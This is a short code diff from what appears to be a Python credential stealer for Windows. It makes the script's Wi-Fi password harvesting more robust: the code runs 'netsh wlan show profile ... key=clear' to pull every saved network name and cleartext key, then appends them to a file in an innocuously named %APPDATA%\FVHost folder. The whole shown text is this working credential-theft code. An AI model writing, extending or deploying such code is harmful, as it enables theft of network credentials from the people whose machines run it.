@@ -82,17 +82,19 @@ if os.path.exists(os.environ["appdata"]+'\\FVHost'+'\\VHost') :
 else:
      pass
 try:
-           
-       interface = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],shell=True).decode('utf-8').split('\n')      
-       profiles = [profilelist.split(":")[1][1:-1] for profilelist in interface if "All User Profile" in profilelist]
-       for profilelist in profiles:  
+       try:    
+          interface = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'],shell=True).decode('utf-8').split('\n')      
+          profiles = [profilelist.split(":")[1][1:-1] for profilelist in interface if "All User Profile" in profilelist]
+          for profilelist in profiles:  
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profilelist, 
                         'key=clear'],shell=True).decode('utf-8').split('\n')
                results = [result.split(":")[1][1:-1] for result in results if "Key Content" in result]
                with open (os.environ["appdata"]+'\\FVHost'+'\\network','a')as file_1:
                        file_2 = file_1.write("{:<}\n{:<}".format(profilelist,results[0])+'\n')
                with open (os.environ["appdata"]+'\\FVHost'+'\\network','r')as file_2:
-                       file_2 =file_2.readlines()     
+                       file_2 =file_2.readlines() 
+       except IndexError:
+           pass
        try:
             ssid1       =   file_2[0]
             password1   =   file_2[1]
